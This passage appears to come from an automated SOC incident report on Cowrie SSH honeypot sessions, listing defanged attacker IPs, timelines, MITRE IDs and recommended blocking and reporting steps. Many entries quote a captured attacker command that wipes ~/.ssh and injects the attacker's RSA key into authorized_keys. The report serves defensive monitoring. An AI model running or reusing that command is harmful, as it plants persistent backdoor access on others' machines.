| `2026-04-25 18:21:45` | `cowrie.command.input` |
| `2026-04-25 18:21:45` | `cowrie.command.failed` |
| `2026-04-25 18:21:45` | `cowrie.log.closed` |
| `2026-04-25 18:21:46` | `cowrie.session.params` |
| `2026-04-25 18:21:46` | `cowrie.command.input` |
| `2026-04-25 18:21:46` | `cowrie.session.file_download` |
| `2026-04-25 18:21:46` | `cowrie.log.closed` |
| `2026-04-25 18:21:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.77[.]79` to AbuseIPDB if not already reported
- [ ] Block `129.121.77[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-729546a33d81

| Field | Detail |
|---|---|
| **Source IP** | `129.121.77[.]79` |
| **First Seen** | 2026-04-25 18:21 |
| **Last Seen** | 2026-04-25 18:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:21:50` | `cowrie.session.connect` |
| `2026-04-25 18:21:50` | `cowrie.client.version` |
| `2026-04-25 18:21:50` | `cowrie.client.kex` |
| `2026-04-25 18:21:51` | `cowrie.login.success` |
| `2026-04-25 18:21:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.77[.]79` to AbuseIPDB if not already reported
- [ ] Block `129.121.77[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fe7e47fd835

| Field | Detail |
|---|---|
| **Source IP** | `147.139.209[.]109` |
| **First Seen** | 2026-04-25 18:22 |
| **Last Seen** | 2026-04-25 18:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:22:09` | `cowrie.session.connect` |
| `2026-04-25 18:22:09` | `cowrie.client.version` |
| `2026-04-25 18:22:09` | `cowrie.client.kex` |
| `2026-04-25 18:22:10` | `cowrie.login.success` |
| `2026-04-25 18:22:10` | `cowrie.session.params` |
| `2026-04-25 18:22:10` | `cowrie.command.input` |
| `2026-04-25 18:22:10` | `cowrie.command.failed` |
| `2026-04-25 18:22:11` | `cowrie.log.closed` |
| `2026-04-25 18:22:11` | `cowrie.session.params` |
| `2026-04-25 18:22:11` | `cowrie.command.input` |
| `2026-04-25 18:22:11` | `cowrie.session.file_download` |
| `2026-04-25 18:22:11` | `cowrie.log.closed` |
| `2026-04-25 18:22:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.139.209[.]109` to AbuseIPDB if not already reported
- [ ] Block `147.139.209[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-665230377b39

| Field | Detail |
|---|---|
| **Source IP** | `147.139.209[.]109` |
| **First Seen** | 2026-04-25 18:22 |
| **Last Seen** | 2026-04-25 18:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:22:13` | `cowrie.session.connect` |
| `2026-04-25 18:22:13` | `cowrie.client.version` |
| `2026-04-25 18:22:13` | `cowrie.client.kex` |
| `2026-04-25 18:22:14` | `cowrie.login.success` |
| `2026-04-25 18:22:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.139.209[.]109` to AbuseIPDB if not already reported
- [ ] Block `147.139.209[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bebf7ec1b93

| Field | Detail |
|---|---|
| **Source IP** | `129.121.77[.]79` |
| **First Seen** | 2026-04-25 18:22 |
| **Last Seen** | 2026-04-25 18:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:22:39` | `cowrie.session.connect` |
| `2026-04-25 18:22:39` | `cowrie.client.version` |
| `2026-04-25 18:22:39` | `cowrie.client.kex` |
| `2026-04-25 18:22:40` | `cowrie.login.success` |
| `2026-04-25 18:22:41` | `cowrie.session.params` |
| `2026-04-25 18:22:41` | `cowrie.command.input` |
| `2026-04-25 18:22:41` | `cowrie.command.failed` |
| `2026-04-25 18:22:41` | `cowrie.log.closed` |
| `2026-04-25 18:22:41` | `cowrie.session.params` |
| `2026-04-25 18:22:41` | `cowrie.command.input` |
| `2026-04-25 18:22:42` | `cowrie.session.file_download` |
| `2026-04-25 18:22:42` | `cowrie.log.closed` |
| `2026-04-25 18:22:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.77[.]79` to AbuseIPDB if not already reported
- [ ] Block `129.121.77[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cec57067358

| Field | Detail |
|---|---|
| **Source IP** | `129.121.77[.]79` |
| **First Seen** | 2026-04-25 18:22 |
| **Last Seen** | 2026-04-25 18:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:22:45` | `cowrie.session.connect` |
| `2026-04-25 18:22:45` | `cowrie.client.version` |
| `2026-04-25 18:22:45` | `cowrie.client.kex` |
| `2026-04-25 18:22:46` | `cowrie.login.success` |
| `2026-04-25 18:22:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.77[.]79` to AbuseIPDB if not already reported
- [ ] Block `129.121.77[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74adfa6f363d

| Field | Detail |
|---|---|
| **Source IP** | `129.121.77[.]79` |
| **First Seen** | 2026-04-25 18:23 |
| **Last Seen** | 2026-04-25 18:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:23:29` | `cowrie.session.connect` |
| `2026-04-25 18:23:29` | `cowrie.client.version` |
| `2026-04-25 18:23:29` | `cowrie.client.kex` |
| `2026-04-25 18:23:30` | `cowrie.login.success` |
| `2026-04-25 18:23:31` | `cowrie.session.params` |
| `2026-04-25 18:23:31` | `cowrie.command.input` |
| `2026-04-25 18:23:31` | `cowrie.command.failed` |
| `2026-04-25 18:23:31` | `cowrie.log.closed` |
| `2026-04-25 18:23:31` | `cowrie.session.params` |
| `2026-04-25 18:23:31` | `cowrie.command.input` |
| `2026-04-25 18:23:32` | `cowrie.session.file_download` |
| `2026-04-25 18:23:32` | `cowrie.log.closed` |
| `2026-04-25 18:23:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.77[.]79` to AbuseIPDB if not already reported
- [ ] Block `129.121.77[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-182679c9a97a

| Field | Detail |
|---|---|
| **Source IP** | `147.139.209[.]109` |
| **First Seen** | 2026-04-25 18:23 |
| **Last Seen** | 2026-04-25 18:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:23:29` | `cowrie.session.connect` |
| `2026-04-25 18:23:29` | `cowrie.client.version` |
| `2026-04-25 18:23:29` | `cowrie.client.kex` |
| `2026-04-25 18:23:30` | `cowrie.login.success` |
| `2026-04-25 18:23:30` | `cowrie.session.params` |
| `2026-04-25 18:23:30` | `cowrie.command.input` |
| `2026-04-25 18:23:30` | `cowrie.command.failed` |
| `2026-04-25 18:23:31` | `cowrie.log.closed` |
| `2026-04-25 18:23:31` | `cowrie.session.params` |
| `2026-04-25 18:23:31` | `cowrie.command.input` |
| `2026-04-25 18:23:31` | `cowrie.session.file_download` |
| `2026-04-25 18:23:31` | `cowrie.log.closed` |
| `2026-04-25 18:23:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.139.209[.]109` to AbuseIPDB if not already reported
- [ ] Block `147.139.209[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c89a62421b3

| Field | Detail |
|---|---|
| **Source IP** | `147.139.209[.]109` |
| **First Seen** | 2026-04-25 18:23 |
| **Last Seen** | 2026-04-25 18:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:23:33` | `cowrie.session.connect` |
| `2026-04-25 18:23:33` | `cowrie.client.version` |
| `2026-04-25 18:23:33` | `cowrie.client.kex` |
| `2026-04-25 18:23:34` | `cowrie.login.success` |
| `2026-04-25 18:23:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.139.209[.]109` to AbuseIPDB if not already reported
- [ ] Block `147.139.209[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea5f47fcafc0

| Field | Detail |
|---|---|
| **Source IP** | `129.121.77[.]79` |
| **First Seen** | 2026-04-25 18:23 |
| **Last Seen** | 2026-04-25 18:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:23:35` | `cowrie.session.connect` |
| `2026-04-25 18:23:35` | `cowrie.client.version` |
| `2026-04-25 18:23:35` | `cowrie.client.kex` |
| `2026-04-25 18:23:36` | `cowrie.login.success` |
| `2026-04-25 18:23:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.77[.]79` to AbuseIPDB if not already reported
- [ ] Block `129.121.77[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a24d5d084bb8

| Field | Detail |
|---|---|
| **Source IP** | `129.121.77[.]79` |
| **First Seen** | 2026-04-25 18:24 |
| **Last Seen** | 2026-04-25 18:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:24:19` | `cowrie.session.connect` |
| `2026-04-25 18:24:19` | `cowrie.client.version` |
| `2026-04-25 18:24:20` | `cowrie.client.kex` |
| `2026-04-25 18:24:21` | `cowrie.login.success` |
| `2026-04-25 18:24:21` | `cowrie.session.params` |
| `2026-04-25 18:24:21` | `cowrie.command.input` |
| `2026-04-25 18:24:21` | `cowrie.command.failed` |
| `2026-04-25 18:24:21` | `cowrie.log.closed` |
| `2026-04-25 18:24:22` | `cowrie.session.params` |
| `2026-04-25 18:24:22` | `cowrie.command.input` |
| `2026-04-25 18:24:22` | `cowrie.session.file_download` |
| `2026-04-25 18:24:22` | `cowrie.log.closed` |
| `2026-04-25 18:24:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.77[.]79` to AbuseIPDB if not already reported
- [ ] Block `129.121.77[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2d1fa178df8

| Field | Detail |
|---|---|
| **Source IP** | `129.121.77[.]79` |
| **First Seen** | 2026-04-25 18:24 |
| **Last Seen** | 2026-04-25 18:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:24:26` | `cowrie.session.connect` |
| `2026-04-25 18:24:26` | `cowrie.client.version` |
| `2026-04-25 18:24:26` | `cowrie.client.kex` |
| `2026-04-25 18:24:27` | `cowrie.login.success` |
| `2026-04-25 18:24:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.77[.]79` to AbuseIPDB if not already reported
- [ ] Block `129.121.77[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-295dfbf6ce78

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-25 18:24 |
| **Last Seen** | 2026-04-25 18:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:24:34` | `cowrie.session.connect` |
| `2026-04-25 18:24:34` | `cowrie.client.version` |
| `2026-04-25 18:24:34` | `cowrie.client.kex` |
| `2026-04-25 18:24:35` | `cowrie.login.success` |
| `2026-04-25 18:24:35` | `cowrie.session.params` |
| `2026-04-25 18:24:35` | `cowrie.command.input` |
| `2026-04-25 18:24:35` | `cowrie.command.failed` |
| `2026-04-25 18:24:35` | `cowrie.log.closed` |
| `2026-04-25 18:24:35` | `cowrie.session.params` |
| `2026-04-25 18:24:35` | `cowrie.command.input` |
| `2026-04-25 18:24:36` | `cowrie.session.file_download` |
| `2026-04-25 18:24:36` | `cowrie.log.closed` |
| `2026-04-25 18:24:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f55cfbca071

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-25 18:24 |
| **Last Seen** | 2026-04-25 18:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:24:37` | `cowrie.session.connect` |
| `2026-04-25 18:24:37` | `cowrie.client.version` |
| `2026-04-25 18:24:38` | `cowrie.client.kex` |
| `2026-04-25 18:24:38` | `cowrie.login.success` |
| `2026-04-25 18:24:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5064b269f014

| Field | Detail |
|---|---|
| **Source IP** | `147.139.209[.]109` |
| **First Seen** | 2026-04-25 18:24 |
| **Last Seen** | 2026-04-25 18:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:24:53` | `cowrie.session.connect` |
| `2026-04-25 18:24:53` | `cowrie.client.version` |
| `2026-04-25 18:24:53` | `cowrie.client.kex` |
| `2026-04-25 18:24:54` | `cowrie.login.success` |
| `2026-04-25 18:24:54` | `cowrie.session.params` |
| `2026-04-25 18:24:54` | `cowrie.command.input` |
| `2026-04-25 18:24:54` | `cowrie.command.failed` |
| `2026-04-25 18:24:55` | `cowrie.log.closed` |
| `2026-04-25 18:24:55` | `cowrie.session.params` |
| `2026-04-25 18:24:55` | `cowrie.command.input` |
| `2026-04-25 18:24:55` | `cowrie.session.file_download` |
| `2026-04-25 18:24:55` | `cowrie.log.closed` |
| `2026-04-25 18:24:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.139.209[.]109` to AbuseIPDB if not already reported
- [ ] Block `147.139.209[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-287501247fb8

| Field | Detail |
|---|---|
| **Source IP** | `147.139.209[.]109` |
| **First Seen** | 2026-04-25 18:24 |
| **Last Seen** | 2026-04-25 18:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:24:57` | `cowrie.session.connect` |
| `2026-04-25 18:24:57` | `cowrie.client.version` |
| `2026-04-25 18:24:57` | `cowrie.client.kex` |
| `2026-04-25 18:24:58` | `cowrie.login.success` |
| `2026-04-25 18:24:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.139.209[.]109` to AbuseIPDB if not already reported
- [ ] Block `147.139.209[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c9f63d61739

| Field | Detail |
|---|---|
| **Source IP** | `129.121.77[.]79` |
| **First Seen** | 2026-04-25 18:25 |
| **Last Seen** | 2026-04-25 18:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:25:09` | `cowrie.session.connect` |
| `2026-04-25 18:25:09` | `cowrie.client.version` |
| `2026-04-25 18:25:09` | `cowrie.client.kex` |
| `2026-04-25 18:25:10` | `cowrie.login.success` |
| `2026-04-25 18:25:10` | `cowrie.session.params` |
| `2026-04-25 18:25:10` | `cowrie.command.input` |
| `2026-04-25 18:25:10` | `cowrie.command.failed` |
| `2026-04-25 18:25:11` | `cowrie.log.closed` |
| `2026-04-25 18:25:11` | `cowrie.session.params` |
| `2026-04-25 18:25:11` | `cowrie.command.input` |
| `2026-04-25 18:25:12` | `cowrie.session.file_download` |
| `2026-04-25 18:25:12` | `cowrie.log.closed` |
| `2026-04-25 18:25:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.77[.]79` to AbuseIPDB if not already reported
- [ ] Block `129.121.77[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1d447c80783

| Field | Detail |
|---|---|
| **Source IP** | `129.121.77[.]79` |
| **First Seen** | 2026-04-25 18:25 |
| **Last Seen** | 2026-04-25 18:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:25:15` | `cowrie.session.connect` |
| `2026-04-25 18:25:15` | `cowrie.client.version` |
| `2026-04-25 18:25:15` | `cowrie.client.kex` |
| `2026-04-25 18:25:16` | `cowrie.login.success` |
| `2026-04-25 18:25:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.77[.]79` to AbuseIPDB if not already reported
- [ ] Block `129.121.77[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

